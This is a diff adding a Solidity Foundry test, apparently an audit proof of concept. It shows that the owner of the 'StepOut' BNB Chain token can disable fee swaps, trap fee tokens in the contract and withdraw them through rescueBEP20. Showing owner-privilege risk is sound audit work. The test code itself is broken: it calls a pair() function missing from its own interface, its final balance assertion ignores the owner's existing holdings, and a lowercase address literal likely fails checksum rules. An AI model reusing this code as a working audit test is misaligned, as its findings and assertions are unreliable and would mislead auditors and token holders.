@@ -1,0 +1,92 @@
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity 0.8.12;
+
+import "forge-std/Test.sol";
+
+interface IStepOut {
+    function balanceOf(address) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function swapEnabled() external view returns (bool);
+    function setSwapEnabled(bool state) external;
+    function swapThreshold() external view returns (uint256);
+    function setSwapThreshold(uint256 new_amount) external;
+    function rescueBEP20(address tokenAddress, uint256 amount) external;
+    function rescueBNB(uint256 weiAmount) external;
+    function owner() external view returns (address);
+    function taxes() external view returns (uint256 marketing, uint256 liquidity, uint256 burn);
+    function sellTaxes() external view returns (uint256 marketing, uint256 liquidity, uint256 burn);
+    function excludedFromFees(address) external view returns (bool);
+    function updateExcludedFromFees(address _address, bool state) external;
+}
+
+contract ExploitTest is Test {
+    address constant TOKEN = 0x20e53d8081f135e7332382501798b57544fc6327;
+    address constant PANCAKE_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
+    address constant WBNB = 0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c;
+    address constant BURN = 0x000000000000000000000000000000000000dEaD;
+
+    IStepOut token;
+    address owner;
+    address alice = address(0x1);
+    address bob = address(0x2);
+
+    function setUp() public {
+        token = IStepOut(TOKEN);
+        owner = token.owner();
+        vm.label(TOKEN, "StepOut");
+        vm.label(owner, "Owner");
+        vm.label(alice, "Alice");
+        vm.label(bob, "Bob");
+    }
+
+    // PoC: Owner can disable the swap mechanism, effectively stopping the fee distribution
+    // and trapping tokens in the contract. Owner can then rescue those tokens.
+    function testOwnerStopsTransactions() public {
+        // Give some tokens to Alice (simulate a user)
+        uint256 amount = 1000 * 1e18;
+        vm.prank(owner);
+        token.transfer(alice, amount);
+        assertEq(token.balanceOf(alice), amount);
+
+        // Owner disables swap
+        vm.prank(owner);
+        token.setSwapEnabled(false);
+        assertFalse(token.swapEnabled());
+
+        // Owner also sets swapThreshold to a huge value to prevent any automatic swapping
+        vm.prank(owner);
+        token.setSwapThreshold(type(uint256).max);
+
+        // Alice tries to transfer tokens to the pair (simulating a sell) - transfer succeeds, but
+        // the internal swap for fees never executes because swapEnabled is false.
+        // This will cause all future fee-collected tokens to remain stuck in the contract.
+        // We simulate this by having Alice transfer tokens to a dummy address; the contract collects fees.
+        // To be realistic, we send tokens to the pair address, which triggers the pair branch.
+        address pair = token.pair();
+        // Approve router for token (not needed for transfer, but for realism)
+        // Instead, just transfer to pair (which is the Uniswap pair) – the token contract will take fees.
+        vm.prank(alice);
+        token.transfer(pair, amount / 2);
+
+        // Check that the contract now holds some tokens (from fees)
+        uint256 contractBalance = token.balanceOf(TOKEN);
+        assertGt(contractBalance, 0);
+
+        // The swap would normally have swapped these tokens into BNB and distributed, but because
+        // setSwapEnabled(false) and setSwapThreshold(max), the swap never triggers.
+        // The owner can now rescue these tokens via rescueBEP20 (owner-only).
+        // This demonstrates that the owner has control to stop the intended fee distribution
+        // and extract value.
+        vm.prank(owner);
+        token.rescueBEP20(TOKEN, contractBalance);
+        // After rescue, the contract has 0 tokens and owner has them.
+        assertEq(token.balanceOf(TOKEN), 0);
+        assertEq(token.balanceOf(owner), contractBalance);
+
+        // Additionally, the owner can rescue any BNB that might have accumulated from swaps
+        // (if any previous swap had occurred). In this scenario, because swaps are disabled,
+        // no BNB is accumulated, but the rescue functions are still available only to owner.
+    }
+}
+```
